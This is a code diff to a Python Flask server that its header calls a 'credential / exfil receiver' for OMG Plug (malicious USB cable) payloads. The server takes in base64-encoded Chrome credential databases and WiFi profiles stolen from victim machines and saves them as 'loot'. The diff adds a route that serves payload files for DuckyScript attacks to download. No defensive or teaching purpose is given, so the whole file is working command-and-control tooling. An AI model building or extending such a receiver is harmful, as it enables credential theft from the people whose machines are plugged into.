@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # ~/hexbox/c2/catcher.py — credential / exfil receiver for OMG Plug payloads
 
-from flask import Flask, request
+from flask import Flask, request, send_file
 from pathlib import Path
-import base64, json, os
+import base64, binascii, json, os
 
 app = Flask(__name__)
 
@@ -18,7 +18,8 @@ def _loot_base() -> Path:
     return Path.home() / "hexbox" / "loot"
 
 
-LOOT = _loot_base()
+LOOT     = _loot_base()
+PAYLOADS = Path(__file__).parent.parent / "payloads"
 
 
 @app.route("/upload", methods=["POST"])
@@ -29,9 +30,13 @@ def upload_chrome():
     raw  = request.form.get("data", "")
     if not raw:
         return "missing data", 400
+    try:
+        data = base64.b64decode(raw)
+    except (binascii.Error, ValueError):
+        return "invalid base64", 400
     dest = LOOT / "creds" / f"{host}_{user}_chrome.db"
     dest.parent.mkdir(parents=True, exist_ok=True)
-    dest.write_bytes(base64.b64decode(raw))
+    dest.write_bytes(data)
     print(f"[+] Chrome DB from {host}\\{user} → {dest}")
     return "OK"
 
@@ -43,9 +48,19 @@ def upload_wifi():
     data = request.form.get("d", "")
     dest = LOOT / "creds" / f"{host}_wifi.txt"
     dest.parent.mkdir(parents=True, exist_ok=True)
-    dest.write_text(data)
+    dest.write_text(data, encoding="utf-8")
     print(f"[+] WiFi profiles from {host} → {dest}")
     return "OK"
+
+
+@app.route("/serve/<name>")
+def serve_file(name: str):
+    """Serve a payload file so DuckyScript payloads can download it."""
+    safe = Path(name).name
+    path = PAYLOADS / safe
+    if path.is_file():
+        return send_file(str(path))
+    return "Not found", 404
 
 
 if __name__ == "__main__":
